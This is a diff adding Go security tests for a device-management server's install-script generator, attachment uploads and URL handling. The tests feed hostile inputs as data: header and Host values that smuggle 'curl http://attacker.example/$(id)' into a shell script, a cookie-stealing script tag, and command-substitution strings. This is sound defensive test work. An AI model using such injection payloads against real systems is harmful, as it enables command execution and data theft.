@@ -1,10 +1,14 @@
 package app
 
 import (
+	"bytes"
 	"encoding/json"
 	"errors"
+	"fmt"
+	"mime/multipart"
 	"net/http"
 	"net/http/httptest"
+	"net/textproto"
 	"path/filepath"
 	"strings"
 	"testing"
@@ -582,5 +586,255 @@ func TestInternalErrorsAreNotExposed(t *testing.T) {
 	s.writeError(rec, http.StatusInternalServerError, errors.New("sqlite: secret internal detail"))
 	if body := rec.Body.String(); strings.Contains(body, "secret internal detail") {
 		t.Fatalf("internal error leaked: %s", body)
+	}
+}
+
+// TestAgentInstallScriptIgnoresHostileSchemeHeader ensures an attacker-supplied
+// X-Forwarded-Proto cannot inject shell fragments into the generated script.
+func TestAgentInstallScriptIgnoresHostileSchemeHeader(t *testing.T) {
+	s := newTestServer(t)
+	s.flags.EnableLegacyInstall = true
+
+	user, err := s.store.CreateUser("scheme@example.com", "correct horse battery staple")
+	if err != nil {
+		t.Fatal(err)
+	}
+	session, err := s.store.CreateSession(user.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	req := httptest.NewRequest(http.MethodGet, "/api/agent/install.sh", nil)
+	req.Header.Set("Authorization", "Bearer "+session.Token)
+	req.Header.Set("X-Forwarded-Proto", `https"; curl http://attacker.example/$(id); echo "`)
+	rec := httptest.NewRecorder()
+	s.handleAgentInstallScript(rec, req)
+
+	if rec.Code != http.StatusOK {
+		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
+	}
+	script := rec.Body.String()
+	if !strings.Contains(script, `SERVER_URL="http://example.com"`) {
+		t.Fatalf("expected sanitized server URL, script:\n%s", script)
+	}
+	if strings.Contains(script, "attacker.example") {
+		t.Fatalf("hostile header leaked into script:\n%s", script)
+	}
+}
+
+// TestAgentInstallScriptRejectsHostileHost ensures a hostile Host header is
+// rejected instead of being reflected into the install script.
+func TestAgentInstallScriptRejectsHostileHost(t *testing.T) {
+	s := newTestServer(t)
+	s.flags.EnableLegacyInstall = true
+
+	user, err := s.store.CreateUser("host@example.com", "correct horse battery staple")
+	if err != nil {
+		t.Fatal(err)
+	}
+	session, err := s.store.CreateSession(user.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	req := httptest.NewRequest(http.MethodGet, "/api/agent/install.sh", nil)
+	req.Header.Set("Authorization", "Bearer "+session.Token)
+	req.Host = `evil.com"; curl http://attacker.example/$(id); echo "`
+	rec := httptest.NewRecorder()
+	s.handleAgentInstallScript(rec, req)
+
+	if rec.Code != http.StatusBadRequest {
+		t.Fatalf("expected 400 for hostile host, got %d: %s", rec.Code, rec.Body.String())
+	}
+}
+
+// buildMultipart encodes a single file part for the attachment upload endpoint.
+func buildMultipart(t *testing.T, filename, contentType string, data []byte) (*bytes.Buffer, string) {
+	t.Helper()
+	var buf bytes.Buffer
+	mw := multipart.NewWriter(&buf)
+	header := make(textproto.MIMEHeader)
+	header.Set("Content-Disposition", fmt.Sprintf(`form-data; name="file"; filename="%s"`, filename))
+	header.Set("Content-Type", contentType)
+	part, err := mw.CreatePart(header)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := part.Write(data); err != nil {
+		t.Fatal(err)
+	}
+	if err := mw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return &buf, mw.FormDataContentType()
+}
+
+func uploadAttachment(t *testing.T, s *Server, deviceID, token string, body *bytes.Buffer, contentType string) *httptest.ResponseRecorder {
+	t.Helper()
+	req := httptest.NewRequest(http.MethodPost, "/api/devices/"+deviceID+"/attachments", body)
+	req.Header.Set("Content-Type", contentType)
+	req.Header.Set("Authorization", "Bearer "+token)
+	rec := httptest.NewRecorder()
+	// Exercise the real middleware chain: the global JSON cap must not clamp
+	// attachment uploads to 2 MB.
+	limitBody(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		s.handleDeviceAttachments(w, r, deviceID)
+	})).ServeHTTP(rec, req)
+	return rec
+}
+
+func newAuthedDevice(t *testing.T, s *Server, email string) (ownerID, token, deviceID string) {
+	t.Helper()
+	user, err := s.store.CreateUser(email, "correct horse battery staple")
+	if err != nil {
+		t.Fatal(err)
+	}
+	session, err := s.store.CreateSession(user.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	device, err := s.store.RegisterDevice("pc-"+email, "", user.ID, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	return user.ID, session.Token, device.ID
+}
+
+// TestAttachmentHtmlCannotExecuteInline ensures an uploaded HTML payload is
+// stored/served as an opaque download, never as executable inline content.
+func TestAttachmentHtmlCannotExecuteInline(t *testing.T) {
+	s := newTestServer(t)
+	ownerID, token, deviceID := newAuthedDevice(t, s, "att-html@example.com")
+
+	body, ctype := buildMultipart(t, "payload.html", "text/html", []byte("<script>alert(document.cookie)</script>"))
+	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("upload status = %d body=%s", rec.Code, rec.Body.String())
+	}
+
+	atts, err := s.store.GetDeviceAttachments(deviceID, ownerID)
+	if err != nil || len(atts) != 1 {
+		t.Fatalf("attachments = %v, err = %v", atts, err)
+	}
+	if atts[0].MimeType != "application/octet-stream" {
+		t.Fatalf("stored mime = %q, want application/octet-stream", atts[0].MimeType)
+	}
+
+	dlReq := httptest.NewRequest(http.MethodGet, "/api/devices/"+deviceID+"/attachments/"+atts[0].ID, nil)
+	dlReq.Header.Set("Authorization", "Bearer "+token)
+	dlRec := httptest.NewRecorder()
+	s.handleDeviceAttachmentByID(dlRec, dlReq, deviceID, atts[0].ID)
+
+	if ct := dlRec.Header().Get("Content-Type"); ct != "application/octet-stream" {
+		t.Fatalf("download content-type = %q, want application/octet-stream", ct)
+	}
+	if cd := dlRec.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
+		t.Fatalf("download disposition = %q, want attachment", cd)
+	}
+	if csp := dlRec.Header().Get("Content-Security-Policy"); !strings.Contains(csp, "sandbox") {
+		t.Fatalf("download missing sandbox CSP, got %q", csp)
+	}
+}
+
+// TestAttachmentImageServedInline ensures real images are still served inline.
+func TestAttachmentImageServedInline(t *testing.T) {
+	s := newTestServer(t)
+	ownerID, token, deviceID := newAuthedDevice(t, s, "att-png@example.com")
+
+	png := append([]byte("\x89PNG\r\n\x1a\n"), bytes.Repeat([]byte{0}, 512)...)
+	body, ctype := buildMultipart(t, "pic.png", "image/png", png)
+	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("upload status = %d body=%s", rec.Code, rec.Body.String())
+	}
+
+	atts, err := s.store.GetDeviceAttachments(deviceID, ownerID)
+	if err != nil || len(atts) != 1 {
+		t.Fatalf("attachments = %v, err = %v", atts, err)
+	}
+	if atts[0].MimeType != "image/png" {
+		t.Fatalf("stored mime = %q, want image/png", atts[0].MimeType)
+	}
+
+	dlReq := httptest.NewRequest(http.MethodGet, "/api/devices/"+deviceID+"/attachments/"+atts[0].ID, nil)
+	dlReq.Header.Set("Authorization", "Bearer "+token)
+	dlRec := httptest.NewRecorder()
+	s.handleDeviceAttachmentByID(dlRec, dlReq, deviceID, atts[0].ID)
+
+	if ct := dlRec.Header().Get("Content-Type"); ct != "image/png" {
+		t.Fatalf("download content-type = %q, want image/png", ct)
+	}
+	if cd := dlRec.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "inline") {
+		t.Fatalf("download disposition = %q, want inline", cd)
+	}
+}
+
+// TestAttachmentBetweenTwoAndEightMBIsAccepted proves the global 2 MB JSON cap
+// no longer truncates attachment uploads (the route cap is 8 MB).
+func TestAttachmentBetweenTwoAndEightMBIsAccepted(t *testing.T) {
+	s := newTestServer(t)
+	_, token, deviceID := newAuthedDevice(t, s, "att-big@example.com")
+
+	data := bytes.Repeat([]byte("a"), 3<<20)
+	body, ctype := buildMultipart(t, "blob.bin", "application/octet-stream", data)
+	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
+	if rec.Code != http.StatusCreated {
+		t.Fatalf("3 MB upload status = %d body=%s", rec.Code, rec.Body.String())
+	}
+}
+
+// TestAttachmentOverEightMBIsRejected ensures the per-route cap still applies.
+func TestAttachmentOverEightMBIsRejected(t *testing.T) {
+	s := newTestServer(t)
+	_, token, deviceID := newAuthedDevice(t, s, "att-huge@example.com")
+
+	data := bytes.Repeat([]byte("a"), 9<<20)
+	body, ctype := buildMultipart(t, "huge.bin", "application/octet-stream", data)
+	rec := uploadAttachment(t, s, deviceID, token, body, ctype)
+	if rec.Code != http.StatusBadRequest {
+		t.Fatalf("9 MB upload status = %d, want 400 body=%s", rec.Code, rec.Body.String())
+	}
+}
+
+func TestIsAttachmentUpload(t *testing.T) {
+	post := httptest.NewRequest(http.MethodPost, "/api/devices/dev-1/attachments", nil)
+	if !isAttachmentUpload(post) {
+		t.Fatal("POST /attachments should bypass the global JSON cap")
+	}
+	for _, req := range []*http.Request{
+		httptest.NewRequest(http.MethodGet, "/api/devices/dev-1/attachments", nil),
+		httptest.NewRequest(http.MethodPost, "/api/devices/dev-1/sync", nil),
+	} {
+		if isAttachmentUpload(req) {
+			t.Fatalf("%s %s should not bypass the global JSON cap", req.Method, req.URL.Path)
+		}
+	}
+}
+
+func TestPublicBaseURLHonorsConfiguredValue(t *testing.T) {
+	t.Setenv("LEM_PUBLIC_URL", "https://lem.example.com/")
+	req := httptest.NewRequest(http.MethodGet, "/install/token", nil)
+	got, err := publicBaseURL(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got != "https://lem.example.com" {
+		t.Fatalf("publicBaseURL = %q, want https://lem.example.com", got)
+	}
+}
+
+func TestPublicBaseURLRejectsInvalidConfiguredValue(t *testing.T) {
+	t.Setenv("LEM_PUBLIC_URL", "ftp://lem.example.com")
+	if _, err := publicBaseURL(httptest.NewRequest(http.MethodGet, "/install/token", nil)); err == nil {
+		t.Fatal("expected error for non-http(s) LEM_PUBLIC_URL")
+	}
+}
+
+func TestShellDoubleQuoteNeutralizesInjection(t *testing.T) {
+	got := shellDoubleQuote("x\"; $(id); `whoami`")
+	for _, want := range []string{`\"`, `\$(id)`, "\\`"} {
+		if !strings.Contains(got, want) {
+			t.Fatalf("shellDoubleQuote result %q missing escaped %q", got, want)
+		}
 	}
 }
